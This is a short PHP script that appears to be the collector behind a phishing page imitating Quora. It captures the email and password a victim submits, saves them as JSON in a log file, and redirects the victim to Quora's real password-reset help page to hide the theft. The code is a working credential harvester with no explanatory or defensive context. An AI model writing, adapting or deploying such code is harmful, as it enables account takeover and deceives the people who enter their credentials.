<?php


header('Location: https://help.quora.com/hc/en-us/articles/115004232866-How-do-I-change-or-reset-my-password-on-Quora-');
$data = array('site' => 'Quaro',
  'user' => $_POST['email'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>